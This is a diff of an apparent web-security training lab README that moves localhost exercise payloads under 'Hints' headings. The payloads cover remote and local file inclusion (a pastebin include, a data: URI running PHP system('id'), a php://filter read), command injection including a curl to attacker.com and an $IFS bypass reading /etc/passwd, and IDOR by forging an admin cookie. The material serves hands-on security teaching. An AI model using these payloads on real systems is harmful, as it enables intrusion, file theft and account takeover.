@@ -104,39 +104,41 @@
 - https://github.com/swisskyrepo/PayloadsAllTheThings/
 - PHP_LFI_rfc1867 - PHP LFI to arbitratry code execution via rfc1867 file upload temporary files
 - https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752.html
-
-- http://127.0.0.1:8808/?page=help.php
-- http://127.0.0.1:8808/?page=https://pastebin.com/raw/RmeewV7i
-- http://127.0.0.1:8808/?page=data:,%3C?php%20system(%27id%27);%20?%3E#
-- http://127.0.0.1:8808/index.php?page=php://filter/convert.base64-encode/resource=index.php
-- http://127.0.0.1:8808/index.php?page=%68ttps://pastebin.com/raw/RmeewV7i
+- Hints
+    - http://127.0.0.1:8808/?page=help.php
+    - http://127.0.0.1:8808/?page=https://pastebin.com/raw/RmeewV7i
+    - http://127.0.0.1:8808/?page=data:,%3C?php%20system(%27id%27);%20?%3E#
+    - http://127.0.0.1:8808/index.php?page=php://filter/convert.base64-encode/resource=index.php
+    - http://127.0.0.1:8808/index.php?page=%68ttps://pastebin.com/raw/RmeewV7i
 
 ### Command Injection 
-
-- http://127.0.0.1:1337/?curl=https://google.com/;id
-- Blind
-- http://127.0.0.1:1337/blind.php?curl=127.0.0.1;%20sleep%202
-- Semi-blind
-- http://127.0.0.1:1337/semi_blind.php?curl=127.0.0.1%3B+curl+https://attacker.com/
-- Space Bypass
-- http://127.0.0.1:1337/filter.php?curl=127.0.0.1%3Bcat%24IFS%249%2Fetc%2Fpasswd
+- https://www.owasp.org/index.php/Command_Injection
+- https://hackware.ru/?p=1133
+- Hints:
+  - http://127.0.0.1:1337/?curl=https://google.com/;id
+  - Blind
+  - http://127.0.0.1:1337/blind.php?curl=127.0.0.1;%20sleep%202
+  - Semi-blind
+  - http://127.0.0.1:1337/semi_blind.php?curl=127.0.0.1%3B+curl+https://attacker.com/
+  - Space Bypass
+  - http://127.0.0.1:1337/filter.php?curl=127.0.0.1%3Bcat%24IFS%249%2Fetc%2Fpasswd
 
 ### IDOR
 
 - https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/
 - https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004)
-
-- Register like 
-- http://127.0.0.1:1338/?user=admin&pass=admin&type=reg
-- Login like
-- http://127.0.0.1:1338/?user=admin&pass=admin&type=log
-- Register new user
-- http://127.0.0.1:1338/?user=test&pass=test&type=reg
-- Login like
-- http://127.0.0.1:1338/?user=test&pass=test&type=log
-- Change cookie (cook) to YWRtaW4=
-- Refresh page
-- http://127.0.0.1:1338/profile.php
+- Hints
+    - Register like 
+    - http://127.0.0.1:1338/?user=admin&pass=admin&type=reg
+    - Login like
+    - http://127.0.0.1:1338/?user=admin&pass=admin&type=log
+    - Register new user
+    - http://127.0.0.1:1338/?user=test&pass=test&type=reg
+    - Login like
+    - http://127.0.0.1:1338/?user=test&pass=test&type=log
+    - Change cookie (cook) to YWRtaW4=
+    - Refresh page
+    - http://127.0.0.1:1338/profile.php
 
 
 
